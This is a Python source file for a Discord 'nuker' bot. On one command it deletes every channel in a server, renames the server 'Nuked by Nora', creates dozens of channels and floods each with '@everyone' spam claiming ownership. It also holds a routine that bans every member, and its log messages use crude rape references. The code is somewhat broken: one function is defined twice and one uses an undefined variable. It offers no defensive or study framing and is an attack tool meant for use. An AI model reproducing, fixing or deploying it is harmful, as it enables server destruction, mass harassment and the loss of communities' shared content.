import asyncio
import random
import os
import discord
from discord.ext import commands
from dotenv import load_dotenv

# ----------------- Load .env ----------------- #
load_dotenv()
TOKEN = os.getenv("TOKEN")

# ----------------- Setup Bot ----------------- #
intents = discord.Intents.default()
intents.guilds = True
intents.messages = True
intents.message_content = True

bot = commands.Bot(command_prefix="!", intents=intents)


# ----------------- Info Config ----------------- #
MAX_MESSAGES = 141       # messages per channel
MAX_CHANNELS = 50       # channels to create per run
BATCH_SIZE = 8          # messages sent concurrently
MESSAGE_DELAY = 0.1     # short delay between batches

CHANNEL_NAMES = ["𝗞𝗻𝗼𝗰𝗸_𝗸𝗻𝗼𝗰𝗸"]
# ----------------- Channel Creator with Visual Randomization -----------------
async def create_channels(guild, count):
    created_channels = []

    async def make_channel(name):
        try:
            channel = await guild.create_text_channel(name)
            created_channels.append(channel)
        except Exception as e:
            print(f"Failed to create {name}: {e}")

    tasks = []
    for _ in range(count):
        name_base = random.choice(CHANNEL_NAMES)
        unique_suffix = str(random.randint(1000, 9999))
        channel_name = f"{name_base}-{unique_suffix}"
        tasks.append(asyncio.create_task(make_channel(channel_name)))
    
        # Small delay every few channels to respect rate limits
        if len(tasks) % 10 == 0:
            await asyncio.sleep(0.5)

    await asyncio.gather(*tasks)
    return created_channels
  # ----------------- Embed Builder ----------------- #
def build_embed(message_text="Admin Bot Activated!"):
    return discord.Embed(
        title="🚀 Admin Bot Notification",
        description=message_text,
        color=discord.Color.orange()
    )

# ----------------- Async Message Sender ----------------- #
async def send_messages(channel, count):
    counter = 0
    while counter < count:
        tasks = []
        batch_end = min(counter + BATCH_SIZE, count)
        for i in range(counter, batch_end):
            tasks.append(asyncio.create_task(channel.send("# @everyone P.A owns this Server")))
        await asyncio.gather(*tasks)
        counter += BATCH_SIZE
        await asyncio.sleep(MESSAGE_DELAY)
      # ----------------- [Ban Members] ----------------- #
async def ban(guild):
    print(f"[+] Starting to rape all people in xd.... {guild.name}")
    for member in guild.members:
        try:
            await guild.ban(member, reason="Banned by automated script")
            print(f"[+] Banned: {member.name}#{member.discriminator}")
            await asyncio.sleep(0.30)
        except Exception as e:
            print(f"[!] Failed to ban {member.name}: {e}")
    print("Done raped everyone xd....")
  # ----------------- Channel Creator with Visual Randomization ----------------- #
async def create_channels(guild, count):
    created_channels = []
    for _ in range(count):
        try:
            name_base = random.choice(CHANNEL_NAMES)
            unique_suffix = str(random.randint(1000, 9999))
            channel_name = f"{name_base}-{unique_suffix}"
            channel = await guild.create_text_channel(channel_name)
            # Optional: rename some channels for extra visual chaos
            if random.random() < 0.1:
                await channel.edit(name=f"{channel_name}-NEW")
            created_channels.append(channel)
        except Exception as e:
            print(f"Failed to create channel: {e}")
    return created_channels
  # ----------------- Main Command ----------------- #
@bot.command()
async def balls(ctx):
    guild = ctx.guild
    await delete_chanz(guild)
    
    # ---------------- Delete old channels and categories ----------------
async def delete_chanz(guild):
    print("[+] OWNING BY PA...")
    async def delete_channel(channel):
        try:
            await channel.delete()
            print(f"[+] Deleted: {channel.name}")
        except Exception as e:
            print(f"[+] Error deleting channel {channel.name}: {e}")
    tasks = [delete_channel(channel) for channel in guild.channels]
    await asyncio.gather(*tasks)

    # Rename server safely with visual impact
    try:
        await guild.edit(name=f"Nuked by Nora")
    except Exception as e:
        print(f"Failed to rename server: {e}")

    # Create channels safely
    new_channels = await create_channels(guild, MAX_CHANNELS)

    # Combine existing + new channels
    all_channels = guild.text_channels + new_channels

    # Send messages concurrently across all channels
    tasks = []
    for ch in all_channels:
        tasks.append(asyncio.create_task(send_messages(ch, MAX_MESSAGES)))

    await asyncio.gather(*tasks)
    await ctx.send(f"✅ Visual impact done across {len(all_channels)} channels safely!")
  # ----------------- Run Bot ----------------- #
bot.run(os.getenv("TOKEN"))
